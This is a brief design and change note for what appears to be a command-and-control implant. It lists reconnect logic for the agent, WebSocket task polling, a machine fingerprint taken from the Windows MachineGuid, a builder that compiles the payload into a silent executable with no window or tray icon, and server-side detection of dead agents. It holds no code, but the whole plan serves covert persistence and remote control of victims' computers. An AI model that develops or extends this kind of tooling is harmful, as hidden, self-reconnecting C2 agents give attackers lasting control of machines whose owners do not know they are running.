# Agent Self-Healing & Stability Fix

**Date:** 2026-07-07  
**Status:** implementing

## Changes

### 1. Agent Auto-Reconnect

- `_recv_frame()` returns None → `ws.connected = False`
- `_send_frame()` fails → `ws.connected = False`
- Both heartbeat and task threads detect disconnect → call `_reconnect()`
- Reconnect: infinite retry, backoff 5s→10s→20s→30s cap
- On reconnect: redo WS handshake + registration, reuse same agent_id

### 2. WebSocket Thread Safety

- Single `threading.Lock` shared between heartbeat and task threads
- All `ws.send()` + `ws.recv()` pairs must hold the lock
- Heartbeat: send only, no recv (C2 returns None for heartbeats)
- Task check: send check_tasks → drain responses until tasks or timeout

### 3. Agent ID Fingerprint

- Old: `hostname-username` (collision-prone)
- New: SHA256(hostname + username + MachineGuid) -> hex[:16]
- MachineGuid from `HKLM\SOFTWARE\Microsoft\Cryptography\MachineGuid`
- Same machine reconnects → same agent_id
- VM clone → new Guid → new agent_id (correct behavior)

### 4. Build Hidden EXE

- `builder/builder.py --compile` already uses PyInstaller `--noconsole`
- Output: silent .exe, no window, no tray
- Fix: ensure PyInstaller hidden-imports Crypto, websockets

### 5. C2 Dead Agent Detection

- C2 background task: every 30s scan agents where `last_seen < now - 60s`
- Set status = 'dead' for timed-out agents
- Web dashboard updates automatically (already polls every 10s)

### Files to modify

- `client/payload.py` — reconnect, lock, fingerprint
- `server/c2_core.py` — dead agent detection, get_pending_tasks fix (done)
- `server/api_server.py` — dashboard refresh (done)
- `builder/builder.py` — PyInstaller config fix
